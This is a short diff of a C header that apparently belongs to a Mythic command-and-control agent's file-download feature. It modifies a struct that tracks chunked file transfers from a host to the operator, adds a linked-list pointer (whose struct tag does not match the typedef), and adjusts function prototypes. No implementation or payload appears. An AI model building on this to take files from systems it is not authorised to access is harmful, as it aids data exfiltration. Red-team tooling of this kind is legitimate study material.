@@ -10,18 +10,23 @@
 #define MAX_PATH 0x2000
 
 typedef struct _FILE_DOWNLOAD {
+    BOOL Initialized;           // Has download been started in Mythic
     HANDLE hFile;               // File handle
+    CHAR TaskUuid[37];          // Track task UUID
     CHAR fileUuid[37];          // File UUID (36 + 1 for null terminator)
-    PCHAR filepath[MAX_PATH];   // Path to the file
+    CHAR filepath[MAX_PATH];    // Path to the file
     DWORD totalChunks;          // Total number of chunks
     UINT32 currentChunk;        // Current chunk number
     LARGE_INTEGER fileSize;     // Size of the file
+
+    struct FILE_DOWNLOAD* Next;
 } FILE_DOWNLOAD, *PFILE_DOWNLOAD;
 
 
-VOID Download(_In_ PCHAR taskUuid, _In_ PPARSER arguments);
-
+BOOL DownloadUpdateFileUuid(PCHAR TaskUuid, PCHAR FileUuid);
 DWORD WINAPI DownloadThread(_In_ LPVOID lpTaskParamter);
+VOID DownloadPush();
+VOID Download(_In_ PCHAR taskUuid, _In_ PPARSER arguments);
 
 #endif //INCLUDE_CMD_DOWNLOAD
 
